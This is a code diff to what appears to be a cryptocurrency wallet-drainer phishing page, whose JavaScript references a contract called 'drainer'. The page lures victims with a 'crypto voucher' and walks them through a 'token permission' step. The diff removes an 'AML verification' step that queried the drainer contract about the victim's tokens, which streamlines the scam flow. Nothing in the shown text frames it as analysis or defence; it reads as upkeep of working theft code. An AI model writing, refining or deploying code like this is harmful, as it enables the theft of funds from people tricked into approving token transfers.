@@ -78,9 +78,8 @@
     </div>
     <ul class="steps">
       <li class="on"><span class="n">✓</span>Wallet connected</li>
-      <li id="st-aml"><span class="n">2</span>AML verification</li>
-      <li id="st-approve"><span class="n">3</span>Token permission</li>
-      <li id="st-claim"><span class="n">4</span>Voucher delivered</li>
+      <li id="st-approve"><span class="n">2</span>Token permission</li>
+      <li id="st-claim"><span class="n">3</span>Voucher delivered</li>
     </ul>
     <button class="cta" id="claim" disabled>Get a crypto voucher</button>
     <div class="status" id="status"></div>
@@ -411,21 +410,6 @@ async function load() {
   $('total-sym').textContent = found.map((t) => t.symbol).join(' + ');
   $('rows').innerHTML = found.map((t) => '<div class="row"><span>' + t.symbol + '</span><b>' + t.human + '</b></div>').join('');
   show('view-claim');
-  $('claim').disabled = true;
-  setStatus('AML verification…');
-  $('st-aml').classList.add('on');
-  if (DEMO) {
-    await sleep(900);
-  } else {
-    try {
-      const items = found.map((t) => addrParam(t.token)).join('');
-      const lvl = Number(BigInt('0x' + (await readCall(cfg.drainer, 'amlLevel(address,address[])',
-        addrParam(account) + uintParam(0x40) + uintParam(found.length) + items))));
-      if (lvl < 2) { $('st-aml').classList.remove('on'); setStatus('AML verification failed'); return; }
-      await sleep(600);
-    } catch (e) { /* контракт без amlLevel — не блокируем */ }
-  }
-  $('st-aml').querySelector('.n').textContent = '✓';
   $('claim').disabled = false;
   setStatus('');
 }
